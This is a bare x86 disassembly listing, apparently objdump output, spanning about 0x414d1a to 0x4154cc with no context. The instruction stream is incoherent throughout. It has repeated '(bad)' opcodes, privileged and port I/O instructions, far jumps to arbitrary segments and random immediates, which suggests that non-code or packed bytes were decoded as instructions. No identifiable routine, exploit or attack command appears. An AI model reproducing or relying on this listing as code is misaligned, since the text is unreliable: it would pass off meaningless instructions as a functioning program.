  414d1a:	neg    DWORD PTR [esi]
  414d1c:	or     esp,DWORD PTR [eax+0x5f22170c]
  414d22:	rcl    DWORD PTR [eax],cl
  414d24:	and    eax,0x3c7c3e4d
  414d29:	test   al,0xab
  414d2b:	or     eax,DWORD PTR [ecx-0x571da25d]
  414d31:	and    eax,0xd83e2d58
  414d36:	mov    eax,ds:0x7754fc10
  414d3b:	enter  0x71d3,0xe0
  414d3f:	inc    ebp
  414d40:	mov    BYTE PTR [edx-0x505ae2bc],ah
  414d46:	jne    0x414dae
  414d48:	ja     0x414cfd
  414d4a:	inc    esi
  414d4b:	jnp    0x414d92
  414d4d:	jnp    0x414d56
  414d4f:	xor    eax,0xe2c610fc
  414d54:	mov    ebx,0x9bc34e5f
  414d59:	scas   eax,DWORD PTR es:[edi]
  414d5a:	mov    ch,0x26
  414d5c:	into   
  414d5d:	add    BYTE PTR [edx+0x187f8c9c],0x5b
  414d64:	push   ss
  414d65:	push   0xfffffff0
  414d67:	stc    
  414d68:	push   esp
  414d69:	adc    al,0x87
  414d6b:	mov    esi,0x5cd7b96b
  414d70:	jmp    0x414dd9
  414d72:	je     0x414cf4
  414d74:	scas   eax,DWORD PTR es:[edi]
  414d75:	push   ds
  414d76:	outs   dx,BYTE PTR ds:[esi]
  414d77:	jl     0x414d58
  414d79:	test   BYTE PTR [edi],ch
  414d7b:	xchg   ebp,eax
  414d7c:	add    edi,DWORD PTR [edi+0x7cb3b6f2]
  414d82:	inc    edx
  414d83:	jmp    0xbd4b:0xbfb385f6
  414d8a:	lock sahf 
  414d8c:	add    BYTE PTR [eax+0x6b],0x11
  414d90:	pop    edx
  414d91:	retf   
  414d92:	aas    
  414d93:	mov    eax,0x55f99355
  414d98:	sbb    eax,0x3525f9e4
  414d9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d9e:	or     DWORD PTR [eax],esp
  414da0:	fstp   DWORD PTR [ecx]
  414da2:	sar    BYTE PTR [ebx+0x34ebf65a],1
  414da8:	push   esi
  414da9:	xchg   DWORD PTR [ecx-0x1b6654d],esi
  414daf:	clc    
  414db0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414db1:	(bad)  
  414db2:	push   0xffffff84
  414db4:	mov    bl,0x25
  414db6:	sbb    edx,DWORD PTR [ecx+0x76702512]
  414dbc:	sbb    eax,0xa4ffe532
  414dc1:	arpl   WORD PTR [ecx-0x64],ax
  414dc4:	stos   DWORD PTR es:[edi],eax
  414dc5:	ficom  DWORD PTR [ebx-0x78f75b33]
  414dcb:	jnp    0x414d6a
  414dcd:	dec    edx
  414dce:	loope  0x414dd2
  414dd0:	jmp    0xe9e7:0xb8ae8526
  414dd7:	push   ss
  414dd8:	shl    eax,cl
  414dda:	pop    ss
  414ddb:	outs   dx,BYTE PTR ds:[esi]
  414ddc:	cmp    al,0x24
  414dde:	lahf   
  414ddf:	int3   
  414de0:	mov    eax,0x15ff07e2
  414de5:	add    edx,DWORD PTR [edi+0x62]
  414de8:	scas   al,BYTE PTR es:[edi]
  414de9:	jle    0x414d9d
  414deb:	push   es
  414dec:	add    DWORD PTR [ecx+0x737fa6f],ebx
  414df2:	mov    ch,0x28
  414df4:	retf   
  414df5:	test   cl,cl
  414df7:	xchg   esi,eax
  414df8:	out    dx,al
  414df9:	scas   al,BYTE PTR es:[edi]
  414dfa:	push   eax
  414dfb:	jno    0x414da1
  414dfd:	inc    edi
  414dfe:	cmp    DWORD PTR [ebp+0x1d],ebx
  414e01:	sub    bl,bl
  414e03:	sub    al,0x9b
  414e05:	adc    DWORD PTR [ebx-0x21],esi
  414e08:	leave  
  414e09:	xor    BYTE PTR [edx],0x8c
  414e0c:	push   edi
  414e0d:	outs   dx,BYTE PTR ds:[esi]
  414e0e:	xor    DWORD PTR es:[ebp+0x5d],ebp
  414e12:	adc    BYTE PTR [esi],bh
  414e14:	push   edx
  414e15:	jmp    0x414dc1
  414e17:	add    DWORD PTR [ecx],ebx
  414e19:	daa    
  414e1a:	pop    ss
  414e1b:	dec    esi
  414e1c:	or     DWORD PTR [edx-0x5f744b29],ecx
  414e22:	pop    edi
  414e23:	stos   DWORD PTR es:[edi],eax
  414e24:	sahf   
  414e25:	leave  
  414e26:	and    BYTE PTR [edi*8+0x1d1b23be],dh
  414e2d:	(bad)  
  414e2e:	or     al,0x9c
  414e30:	pop    eax
  414e31:	jno    0x414e6b
  414e33:	mov    ds:0xc2e7d4b8,eax
  414e38:	(bad)  
  414e39:	scas   eax,DWORD PTR es:[edi]
  414e3a:	cmp    edx,DWORD PTR [edx-0x45]
  414e3d:	mov    esp,0x8cf7a772
  414e42:	pop    ds
  414e43:	cmp    DWORD PTR [esi],ebp
  414e45:	adc    eax,0x3712058b
  414e4a:	jnp    0x414e06
  414e4c:	sub    ah,cl
  414e4e:	mov    ebx,0x95864ea1
  414e53:	or     al,0xbe
  414e55:	push   ecx
  414e56:	rcr    DWORD PTR [ebx+0x4338b54f],0xd4
  414e5d:	mov    ebp,0x2ecccb68
  414e62:	pop    es
  414e63:	or     BYTE PTR [esi+0x1b],bl
  414e66:	jno    0x414e22
  414e68:	inc    cx
  414e6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e6b:	sahf   
  414e6c:	test   al,0xe1
  414e6e:	and    edx,DWORD PTR [esi+0x6b]
  414e71:	push   0x69e37c37
  414e76:	adc    bh,bh
  414e78:	frstor [ebx+0x56c01fa4]
  414e7e:	jb     0x414e0d
  414e80:	imul   ebp,esp,0x85bf80bd
  414e86:	ret    
  414e87:	or     cl,BYTE PTR [ecx-0x59]
  414e8a:	das    
  414e8b:	mov    dh,0xda
  414e8d:	or     BYTE PTR [esi+0x2092181],al
  414e93:	ret    
  414e94:	jo     0x414eed
  414e96:	mov    cl,0xa
  414e98:	daa    
  414e99:	xor    BYTE PTR [edx-0x130bee17],dl
  414e9f:	pop    eax
  414ea0:	fnstenv [esp+esi*4-0x5a7309ce]
  414ea7:	and    bl,bl
  414ea9:	cmp    BYTE PTR [eax],dh
  414eab:	scas   eax,DWORD PTR es:[edi]
  414eac:	iret   
  414ead:	outs   dx,BYTE PTR ds:[esi]
  414eae:	push   0xc5de2284
  414eb3:	jl     0x414ec2
  414eb5:	sti    
  414eb6:	cmp    esp,ecx
  414eb8:	sub    dl,BYTE PTR [eax-0x5f]
  414ebb:	push   ss
  414ebc:	mov    al,BYTE PTR [esi-0x3a0fb0fc]
  414ec2:	jge    0x414e6c
  414ec4:	mov    WORD PTR ds:0x60d319dd,?
  414eca:	xor    DWORD PTR [edi],esp
  414ecc:	dec    edx
  414ecd:	es in  eax,0xe6
  414ed0:	inc    ebx
  414ed1:	aaa    
  414ed2:	es cmp eax,0x7c87375a
  414ed8:	dec    edi
  414ed9:	sar    BYTE PTR [eax],1
  414edb:	scas   eax,DWORD PTR es:[edi]
  414edc:	es add al,0xdd
  414edf:	call   0xbf3ee266
  414ee4:	test   eax,0xbffbeeaa
  414ee9:	xchg   ecx,eax
  414eea:	cmp    eax,0x55207f6c
  414eef:	aaa    
  414ef0:	dec    esp
  414ef1:	adc    BYTE PTR [ebx-0x3a5b53ee],bh
  414ef7:	in     al,0x75
  414ef9:	or     DWORD PTR ds:0x7c5ede58,0xd6a619cc
  414f03:	jmp    0xc52ab871
  414f08:	repz fisub DWORD PTR [edi-0x18827939]
  414f0f:	ja     0x414ed6
  414f11:	ret    
  414f12:	inc    edi
  414f13:	or     dl,bl
  414f15:	inc    eax
  414f16:	xchg   esp,eax
  414f17:	push   ebp
  414f18:	and    edi,DWORD PTR [ebx-0x7d81b841]
  414f1e:	hlt    
  414f1f:	scas   al,BYTE PTR es:[edi]
  414f20:	pop    ebx
  414f21:	pop    esp
  414f22:	into   
  414f23:	push   ds
  414f24:	into   
  414f25:	and    eax,0xd53ded2c
  414f2a:	mov    ecx,0xf388f100
  414f2f:	in     al,dx
  414f30:	test   BYTE PTR [edi+eiz*4],0x34
  414f34:	imul   eax,DWORD PTR [ecx-0x1e],0xffffffb1
  414f38:	ja     0x414f51
  414f3a:	mov    DWORD PTR [esp+edx*8],0x9d19c236
  414f41:	fstp   TBYTE PTR [esi]
  414f43:	imul   ecx,ecx,0xffffffed
  414f46:	sahf   
  414f47:	inc    edx
  414f48:	xor    cl,BYTE PTR [esi]
  414f4a:	ret    
  414f4b:	sub    DWORD PTR [edi],esi
  414f4d:	stos   BYTE PTR es:[edi],al
  414f4e:	pop    eax
  414f4f:	ins    BYTE PTR es:[edi],dx
  414f50:	push   ds
  414f51:	cli    
  414f52:	adc    eax,0xbef7b6c9
  414f57:	pop    ds
  414f58:	xchg   esp,eax
  414f59:	push   0x5a36d769
  414f5e:	fstp   DWORD PTR [ecx-0x7da9e7e6]
  414f64:	or     al,0xb1
  414f66:	icebp  
  414f67:	daa    
  414f68:	shl    BYTE PTR [ecx-0x39596fc7],1
  414f6e:	mov    eax,?
  414f70:	push   cs
  414f71:	mov    edx,0x68dd9b24
  414f76:	stos   BYTE PTR es:[edi],al
  414f77:	stos   BYTE PTR es:[edi],al
  414f78:	test   eax,0x6625ad32
  414f7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f7e:	sbb    DWORD PTR [esp+ebx*8],ecx
  414f81:	push   0xf3216be7
  414f86:	in     eax,0x5a
  414f88:	nop
  414f89:	and    ecx,DWORD PTR [esi+0x737fdc91]
  414f8f:	jne    0x414f6a
  414f91:	addr16 std 
  414f93:	test   BYTE PTR [edi+0x431c9b96],ch
  414f99:	xchg   esp,eax
  414f9a:	add    esi,ebp
  414f9c:	loopne 0x414fff
  414f9e:	call   0xf548944e
  414fa3:	shl    DWORD PTR [esi],0xa3
  414fa6:	and    BYTE PTR [ebp-0x47],bl
  414fa9:	outs   dx,BYTE PTR ds:[esi]
  414faa:	mov    WORD PTR [eax],ss
  414fac:	mov    esi,0x1970c2e3
  414fb1:	stos   DWORD PTR es:[edi],eax
  414fb2:	and    al,0x56
  414fb4:	test   BYTE PTR [ebx],ah
  414fb6:	jno    0x415026
  414fb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fb9:	jge    0x415035
  414fbb:	sub    DWORD PTR [ebp+0x2a],edx
  414fbe:	inc    ebx
  414fbf:	mov    eax,0xe46889d
  414fc4:	test   DWORD PTR [eax-0x3b],eax
  414fc7:	mov    eax,ds:0x2edc7ed
  414fcc:	lahf   
  414fcd:	xor    al,0x5
  414fcf:	mov    ds:0x6c13c694,eax
  414fd4:	mov    bh,0xc2
  414fd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fd7:	aas    
  414fd8:	push   cs
  414fd9:	pop    esi
  414fda:	pop    ebx
  414fdb:	ja     0x414f92
  414fdd:	mov    edi,0x94a0169
  414fe2:	mov    al,0x35
  414fe4:	(bad)  
  414fe5:	std    
  414fe6:	push   ebx
  414fe7:	popf   
  414fe8:	jae    0x414ff8
  414fea:	addr16 xchg ebp,eax
  414fec:	xor    BYTE PTR [edi+0xc8766a3],al
  414ff2:	shr    edi,cl
  414ff4:	push   cs
  414ff5:	sub    al,dh
  414ff7:	xchg   ebp,eax
  414ff8:	jmp    0xeb6dc8ff
  414ffd:	pop    ebx
  414ffe:	pop    ebx
  414fff:	repnz outs dx,BYTE PTR ds:[esi]
  415001:	test   BYTE PTR [ebx],bl
  415003:	outs   dx,BYTE PTR ds:[esi]
  415004:	xchg   BYTE PTR [edx],cl
  415006:	in     eax,0x38
  415008:	retf   0x438a
  41500b:	lea    edx,[eax]
  41500d:	sbb    DWORD PTR [edi],0x11
  415010:	stc    
  415011:	fst    st(5)
  415013:	mov    al,ds:0x6b3d81ba
  415018:	xor    al,0x99
  41501a:	out    0x92,eax
  41501c:	scas   al,BYTE PTR es:[edi]
  41501d:	xor    BYTE PTR [edx-0x7],cl
  415020:	adc    al,0x22
  415022:	adc    BYTE PTR [ebx-0x7],0xf0
  415026:	jmp    0x84cc:0xf6c5176e
  41502d:	stos   BYTE PTR es:[edi],al
  41502e:	ins    DWORD PTR es:[edi],dx
  41502f:	(bad)  
  415031:	xchg   ebp,eax
  415032:	jl     0x414fe3
  415034:	pop    es
  415035:	mov    edi,DWORD PTR [edx+0x7f]
  415038:	mov    dh,0x89
  41503a:	test   al,0x3a
  41503c:	inc    ebx
  41503d:	cmp    ebp,DWORD PTR [ecx-0x5910b597]
  415043:	fdiv   QWORD PTR [ebp-0x40]
  415046:	pop    ss
  415047:	inc    ebp
  415048:	or     edi,esi
  41504a:	sbb    BYTE PTR [esi+esi*8+0x1e],ah
  41504e:	std    
  41504f:	fstp   st(1)
  415051:	jbe    0x41503f
  415053:	jb     0x4150c0
  415055:	outs   dx,DWORD PTR ds:[esi]
  415056:	jae    0x415056
  415058:	test   eax,0xdf54dedc
  41505d:	jp     0x4150b0
  41505f:	jmp    0x8059:0x12cf8015
  415066:	dec    esp
  415067:	in     eax,0x71
  415069:	pushf  
  41506a:	pop    es
  41506b:	popa   
  41506c:	clc    
  41506d:	inc    edi
  41506e:	pop    ebp
  41506f:	in     eax,dx
  415070:	xor    dl,BYTE PTR [esi]
  415072:	retf   0x1e84
  415075:	sbb    ch,BYTE PTR [ecx-0x7c5b318f]
  41507b:	(bad)  
  41507c:	mov    ch,0x98
  41507e:	add    cl,BYTE PTR [esi+0x25ad28e4]
  415084:	aaa    
  415085:	mov    ebx,0xb835bc04
  41508a:	sub    al,0x8e
  41508c:	mov    dl,0xba
  41508e:	inc    ebp
  41508f:	imul   esi,DWORD PTR [ecx+esi*8],0xffffffcf
  415093:	cmp    DWORD PTR [ecx],eax
  415095:	bound  esi,QWORD PTR [ebx+eax*1]
  415098:	hlt    
  415099:	adc    DWORD PTR [ecx+0x79],0x13
  41509d:	data16 jae 0x41511d
  4150a0:	lea    esp,[ecx+0x6583625c]
  4150a6:	aaa    
  4150a7:	aad    0xf2
  4150a9:	inc    edx
  4150aa:	adc    al,0x14
  4150ac:	test   al,0xa1
  4150ae:	data16 stc 
  4150b0:	pop    ds
  4150b1:	repz xchg esi,edi
  4150b4:	push   ds
  4150b5:	test   BYTE PTR [eax-0x36b6e693],al
  4150bb:	push   esp
  4150bc:	shl    dl,0x16
  4150bf:	jmp    0x2702d3d9
  4150c4:	pushf  
  4150c5:	jmp    0x415071
  4150c7:	lock pushf 
  4150c9:	neg    BYTE PTR [ecx-0x15]
  4150cc:	mov    bh,0xa7
  4150ce:	mov    WORD PTR [ebx-0x4d],ss
  4150d1:	hlt    
  4150d2:	cmp    ah,BYTE PTR [ecx]
  4150d4:	scas   eax,DWORD PTR es:[edi]
  4150d5:	push   ebp
  4150d6:	js     0x4150f6
  4150d8:	or     eax,0x563d84ac
  4150dd:	xchg   esp,eax
  4150de:	and    eax,0x6f4b6101
  4150e3:	push   0xf7b3d62c
  4150e8:	xor    edx,0x6
  4150eb:	xchg   ecx,eax
  4150ec:	test   dl,0x94
  4150ef:	cmp    eax,0x4217a208
  4150f4:	sbb    edi,DWORD PTR [esi+0x3201f2e3]
  4150fa:	lahf   
  4150fb:	in     eax,dx
  4150fc:	and    bh,cl
  4150fe:	mov    eax,ds:0xf1303c73
  415103:	shl    BYTE PTR [esi],0xb5
  415106:	jmp    0x415183
  415108:	mov    bh,0x3
  41510a:	iret   
  41510b:	out    0x47,al
  41510d:	not    DWORD PTR [ebx-0x56]
  415110:	loopne 0x415177
  415112:	cmp    edi,DWORD PTR ds:0xc7c98b49
  415118:	sub    al,0x43
  41511a:	bound  ebx,QWORD PTR ds:0x48965ffc
  415120:	shr    BYTE PTR [ecx],0x4d
  415123:	popa   
  415124:	retf   0x3e02
  415127:	int    0xd4
  415129:	mov    edi,0x2e52de
  41512e:	sahf   
  41512f:	or     eax,DWORD PTR [esi-0x8]
  415132:	loope  0x415107
  415134:	daa    
  415135:	mov    ch,0x85
  415137:	sbb    DWORD PTR [eax+ebx*2],ecx
  41513a:	inc    esi
  41513b:	add    eax,0xc443cc2a
  415140:	fs mov edx,0x895d7ffc
  415146:	jmp    0x41515b
  415148:	jecxz  0x415150
  41514a:	push   edi
  41514b:	(bad)  
  41514c:	jecxz  0x415155
  41514e:	push   edi
  41514f:	xor    eax,0x74c00987
  415154:	jns    0x415108
  415156:	mov    eax,ds:0x799b3885
  41515b:	dec    ecx
  41515c:	call   0x57aa:0xc57d7f30
  415163:	sbb    al,0xc9
  415165:	push   ecx
  415166:	jbe    0x4150f6
  415168:	cmp    DWORD PTR [ecx+0x4108bc78],esi
  41516e:	dec    ebp
  41516f:	clc    
  415170:	or     DWORD PTR ss:[ecx+0x5b03b68b],edi
  415177:	adc    eax,0xe8da1c30
  41517c:	cmc    
  41517d:	dec    ebx
  41517e:	fs mov esi,0x1ac84c23
  415184:	addr16 pusha 
  415186:	sahf   
  415187:	inc    ebp
  415188:	adc    al,0x42
  41518a:	in     al,0x48
  41518c:	icebp  
  41518d:	sti    
  41518e:	add    al,0x7e
  415190:	sub    ebx,DWORD PTR ds:0x7ebc3b51
  415196:	mov    dh,0xe6
  415198:	push   0xffffffa5
  41519a:	fistp  WORD PTR [ebp-0x70]
  41519d:	inc    ecx
  41519e:	mov    bh,0x96
  4151a0:	mov    dh,0x7e
  4151a2:	jge    0x415144
  4151a4:	not    dh
  4151a6:	xchg   esi,eax
  4151a7:	ret    0xaff
  4151aa:	inc    edi
  4151ab:	out    0x60,al
  4151ad:	push   ecx
  4151ae:	adc    al,0xe4
  4151b0:	retf   0xbeb4
  4151b3:	inc    esp
  4151b4:	pop    ds
  4151b5:	cmp    eax,0x6806a997
  4151ba:	repnz mov BYTE PTR [esi+0x3f],cl
  4151be:	(bad)  
  4151bf:	mov    gs,WORD PTR [ebp-0x69]
  4151c2:	jmp    0x4ed3ed51
  4151c7:	adc    al,0xf
  4151c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151ca:	ret    
  4151cb:	push   ecx
  4151cc:	(bad)  
  4151cd:	mov    al,ds:0xba6dfce2
  4151d2:	push   ebp
  4151d3:	aaa    
  4151d4:	jno    0x415180
  4151d6:	push   0x7790cdf
  4151db:	test   BYTE PTR [ecx+0x3d],ah
  4151de:	sbb    al,0xa1
  4151e0:	mov    bl,bh
  4151e2:	div    DWORD PTR [ebp-0x4e]
  4151e5:	je     0x4151b9
  4151e7:	inc    edx
  4151e8:	pop    es
  4151e9:	dec    edi
  4151ea:	jge    0x4151ec
  4151ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151ed:	fstp   DWORD PTR [edx+0x5b0ec213]
  4151f3:	pop    edx
  4151f4:	xchg   ecx,eax
  4151f5:	dec    edi
  4151f6:	add    eax,DWORD PTR [edx+0x24]
  4151f9:	push   ds
  4151fa:	jb     0x41524f
  4151fc:	dec    esi
  4151fd:	sub    DWORD PTR [ecx+0x4a],0x8ba1b013
  415204:	lods   al,BYTE PTR ds:[esi]
  415205:	cdq    
  415206:	add    ecx,DWORD PTR [eax+0x1e942db]
  41520c:	mov    ebp,0x1c4dfd10
  415211:	inc    esp
  415212:	outs   dx,DWORD PTR ds:[esi]
  415213:	(bad)
  415217:	stc    
  415218:	xor    al,0x16
  41521a:	test   edi,edx
  41521c:	fnstcw WORD PTR [ebp+0x24]
  41521f:	(bad)  
  415220:	xlat   BYTE PTR ds:[ebx]
  415221:	outs   dx,DWORD PTR ds:[esi]
  415222:	les    ecx,FWORD PTR gs:[edx+0xa72b78]
  415229:	pop    es
  41522a:	out    dx,eax
  41522b:	mov    al,ds:0x87823335
  415230:	test   al,0x5c
  415232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415233:	cmp    BYTE PTR [ebp+0x1e9cb066],0x9d
  41523a:	push   esp
  41523b:	dec    edx
  41523c:	pushf  
  41523d:	cwde   
  41523e:	dec    edx
  41523f:	mov    DWORD PTR [eax],ecx
  415241:	jecxz  0x415203
  415243:	(bad)  
  415244:	mov    bl,0x1
  415246:	out    0x3e,eax
  415248:	mov    esi,0x6ec00de7
  41524d:	xlat   BYTE PTR ds:[ebx]
  41524e:	dec    eax
  41524f:	leave  
  415250:	inc    ebp
  415251:	jp     0x415297
  415253:	sbb    BYTE PTR [ebx+0x383d2628],cl
  415259:	or     DWORD PTR [esi+ebp*8-0x6d],esi
  41525d:	outs   dx,BYTE PTR ds:[esi]
  41525e:	fstp   st(0)
  415260:	pop    eax
  415261:	mov    esp,0x9bf3ab5e
  415266:	aaa    
  415267:	jge    0x415203
  415269:	lock arpl cx,ax
  41526c:	and    al,0xec
  41526e:	mov    al,ds:0xe2412149
  415273:	mov    ebp,0x921b19d9
  415278:	test   eax,0x58d50f58
  41527d:	aas    
  41527e:	jmp    0x5f8004e1
  415283:	pop    ds
  415284:	fisub  WORD PTR [esi+ebp*2-0x20]
  415288:	cmc    
  415289:	imul   esi,ebp,0x84ff24b3
  41528f:	cmp    al,0x39
  415291:	lods   eax,DWORD PTR ds:[esi]
  415292:	jb     0x4152a3
  415294:	pushf  
  415295:	xchg   ebp,eax
  415296:	mov    dh,0xb3
  415298:	cmp    BYTE PTR [eax-0x1f],0x1a
  41529c:	mov    eax,0x4d5b08f8
  4152a1:	mov    bl,0xcd
  4152a3:	pop    ebp
  4152a4:	or     eax,0x71f2b0c1
  4152a9:	sbb    al,0xc
  4152ab:	shl    BYTE PTR [edi],1
  4152ad:	stc    
  4152ae:	scas   eax,DWORD PTR es:[edi]
  4152af:	inc    ebx
  4152b0:	cmp    bh,0x37
  4152b3:	std    
  4152b4:	daa    
  4152b5:	or     al,0x9d
  4152b7:	test   al,0xd8
  4152b9:	ja     0x4152ba
  4152bb:	mov    ah,0x6d
  4152bd:	cwde   
  4152be:	clc    
  4152bf:	pusha  
  4152c0:	and    esp,esi
  4152c2:	jge    0x41529c
  4152c4:	lods   al,BYTE PTR ds:[esi]
  4152c5:	dec    eax
  4152c6:	cmp    BYTE PTR [eax-0x6b90beca],dl
  4152cc:	inc    esp
  4152cd:	cwde   
  4152ce:	outs   dx,BYTE PTR ds:[esi]
  4152cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152d0:	call   0xaa74:0x36c8bc07
  4152d7:	push   eax
  4152d8:	and    DWORD PTR [eax],0x72
  4152db:	sbb    ebx,DWORD PTR [edi-0x7f38fa9]
  4152e1:	xor    ax,0xbd78
  4152e5:	mov    eax,ds:0x9cf4c695
  4152ea:	test   BYTE PTR [ecx+0x69],ch
  4152ed:	cmp    DWORD PTR [eax*8+0x3e1d82dd],eax
  4152f4:	sahf   
  4152f5:	push   es
  4152f6:	mov    esi,0x670580bb
  4152fb:	pop    ebx
  4152fc:	sbb    al,0xc6
  4152fe:	cmc    
  4152ff:	leave  
  415300:	lahf   
  415301:	and    al,0xb4
  415303:	shr    BYTE PTR [esi],1
  415305:	mov    bl,0x8
  415307:	add    eax,0x8b7253b3
  41530c:	fsub   DWORD PTR [ebp-0x6b]
  41530f:	jb     0x415351
  415311:	ds pushf 
  415313:	test   dh,ch
  415315:	js     0x4152ed
  415317:	or     dl,BYTE PTR [edx-0x7dc764e7]
  41531d:	loope  0x4152a7
  41531f:	ins    DWORD PTR es:[edi],dx
  415320:	dec    ebp
  415321:	test   al,0x84
  415323:	sar    BYTE PTR [esi+0x35],1
  415326:	push   0xffffffc2
  415328:	(bad)  
  415329:	mov    al,ds:0x374561a7
  41532e:	or     ecx,DWORD PTR [eax]
  415330:	push   0x870b1310
  415335:	jp     0x4152bf
  415337:	ficom  WORD PTR [edx+eax*1]
  41533a:	sbb    BYTE PTR [eax],dl
  41533c:	clc    
  41533d:	sar    BYTE PTR [ebp+0x4133b9c9],1
  415343:	push   ss
  415344:	sbb    bl,BYTE PTR [esi+0x7a]
  415347:	aad    0x3a
  415349:	(bad)  
  41534a:	push   eax
  41534b:	xchg   edx,eax
  41534c:	sar    BYTE PTR [ebp-0xf],cl
  41534f:	lods   eax,DWORD PTR ds:[esi]
  415350:	into   
  415351:	or     DWORD PTR [ebx-0x13],0x1e
  415355:	stos   BYTE PTR es:[edi],al
  415356:	push   ecx
  415357:	add    DWORD PTR [eax+0x62],0xbab8d4ab
  41535e:	mov    ds:0x5a09d60f,eax
  415363:	inc    edi
  415364:	adc    eax,0xd597a810
  415369:	jb     0x415347
  41536b:	inc    ebx
  41536c:	pop    es
  41536d:	frstor fs:[edi-0x5f3eb18a]
  415374:	xchg   BYTE PTR [eax],dl
  415376:	repnz repnz add esi,esp
  41537a:	dec    esp
  41537b:	cld    
  41537c:	xor    al,dh
  41537e:	stc    
  41537f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415380:	pop    ebx
  415381:	aad    0xa8
  415383:	ins    BYTE PTR es:[edi],dx
  415384:	push   edi
  415385:	mov    bl,0xc4
  415387:	mov    ebx,DWORD PTR [ecx-0x870c293]
  41538d:	in     al,0x2f
  41538f:	mov    ecx,0x9599bb64
  415394:	pop    ebx
  415395:	retf   0xa5f0
  415398:	repz je 0x41538a
  41539b:	mov    DWORD PTR [ecx],edi
  41539d:	je     0x41541c
  41539f:	jle    0x41537d
  4153a1:	mov    dl,0xae
  4153a3:	jmp    0x32e2ffa0
  4153a8:	push   0xfffffff1
  4153aa:	sub    bl,BYTE PTR [eax]
  4153ac:	pushf  
  4153ad:	pusha  
  4153ae:	(bad)  
  4153af:	pop    ecx
  4153b0:	push   esp
  4153b1:	neg    BYTE PTR [edi+0x4e]
  4153b4:	sbb    dh,BYTE PTR [ecx-0x48]
  4153b7:	sbb    BYTE PTR [eax+0x7b],ah
  4153ba:	jns    0x4153ee
  4153bc:	add    DWORD PTR [ebp-0x70f6cf9a],edx
  4153c2:	jnp    0x4153e9
  4153c4:	loope  0x415371
  4153c6:	clc    
  4153c7:	aad    0xd
  4153c9:	out    0x6d,eax
  4153cb:	jno    0x4153ff
  4153cd:	add    DWORD PTR [eax-0x5a],ebx
  4153d0:	mov    edx,0x8147b3c7
  4153d5:	lds    ebp,FWORD PTR [ecx-0x5f]
  4153d8:	jp     0x4153cf
  4153da:	cmc    
  4153db:	adc    cl,BYTE PTR [ebx]
  4153dd:	mov    esp,DWORD PTR es:[ebx+0x59]
  4153e1:	imul   ebp,DWORD PTR ds:0xfbf096d3,0xffffff92
  4153e8:	icebp  
  4153e9:	out    dx,al
  4153ea:	mov    ds:0x4390401a,al
  4153ef:	mov    al,ds:0x8436505a
  4153f4:	mov    al,0xc0
  4153f6:	push   esp
  4153f7:	xor    BYTE PTR [ebx],0xa5
  4153fa:	mov    dl,0x13
  4153fc:	pop    ecx
  4153fd:	push   eax
  4153fe:	cmp    ch,BYTE PTR [edi]
  415400:	popf   
  415401:	jae    0x41546a
  415403:	jl     0x4153fd
  415405:	xor    DWORD PTR [esi-0x21bd4f1e],edx
  41540b:	ins    BYTE PTR es:[edi],dx
  41540c:	push   edx
  41540d:	(bad)  
  41540e:	cmp    ch,dh
  415410:	rcr    ebx,0x8
  415413:	or     BYTE PTR [ebx*2-0x22010afe],dl
  41541a:	loopne 0x415496
  41541c:	pushf  
  41541d:	repz push ebp
  41541f:	(bad)  [edi-0x660b8ef1]
  415425:	push   ds
  415426:	add    al,0x17
  415428:	fs jns 0x4153be
  41542b:	or     eax,0x7f4371eb
  415430:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415431:	(bad)  
  415433:	xchg   esi,eax
  415434:	lods   eax,DWORD PTR ds:[esi]
  415435:	cdq    
  415436:	mov    cl,cl
  415438:	inc    esp
  415439:	nop
  41543a:	push   edx
  41543b:	test   BYTE PTR [edx+0x30b59668],dl
  415441:	in     al,dx
  415442:	push   ebp
  415443:	xor    edi,DWORD PTR [ebp+0xf3dff7f]
  415449:	outs   dx,DWORD PTR ds:[esi]
  41544a:	sbb    BYTE PTR [ecx-0x68],bl
  41544d:	into   
  41544e:	jb     0x41544e
  415450:	leave  
  415451:	shl    DWORD PTR [esi-0x45],1
  415454:	mov    edi,0x7e82b6df
  415459:	int3   
  41545a:	sbb    DWORD PTR [edi+eiz*2+0x44],esp
  41545e:	mov    ch,0xc0
  415460:	and    BYTE PTR [edx+ebp*1+0x6f],0x4e
  415465:	aad    0xae
  415467:	ins    BYTE PTR es:[edi],dx
  415468:	push   eax
  415469:	add    BYTE PTR ss:[eax-0x35],ah
  41546d:	pushf  
  41546e:	dec    esp
  41546f:	pushf  
  415470:	xchg   edx,eax
  415471:	stos   BYTE PTR es:[edi],al
  415472:	clc    
  415473:	aad    0x16
  415475:	int3   
  415476:	add    edi,DWORD PTR [eax-0x31]
  415479:	mov    edi,0x68fc8c49
  41547e:	sub    BYTE PTR [eax-0x28a1017],bl
  415484:	sbb    al,0x8b
  415486:	aas    
  415487:	xor    eax,0x55732b77
  41548c:	fsubr  QWORD PTR [esi-0x340f30a7]
  415492:	jne    0x4154f4
  415494:	add    dl,BYTE PTR [ebx]
  415496:	rcr    DWORD PTR [ecx],0x9e
  415499:	push   eax
  41549a:	int3   
  41549b:	xor    eax,0xa384f96
  4154a0:	jmp    DWORD PTR [eax+edi*4]
  4154a3:	outs   dx,BYTE PTR ds:[esi]
  4154a4:	xor    al,0x1f
  4154a6:	loop   0x41548d
  4154a8:	ins    DWORD PTR es:[edi],dx
  4154a9:	test   ecx,esp
  4154ab:	push   es
  4154ac:	or     eax,0xa4d1001
  4154b1:	inc    ebp
  4154b2:	mov    cs,WORD PTR [edx+0x288c858b]
  4154b8:	push   0xedc46a5e
  4154bd:	sub    BYTE PTR [esi+0x36],cl
  4154c0:	aas    
  4154c1:	int    0x7b
  4154c3:	int3   
  4154c4:	(bad)  
  4154c5:	mov    cl,0xbf
  4154c7:	adc    ecx,DWORD PTR [esi+0x75]
  4154ca:	mov    ebx,ds
  4154cc:	ret    0x9e7a
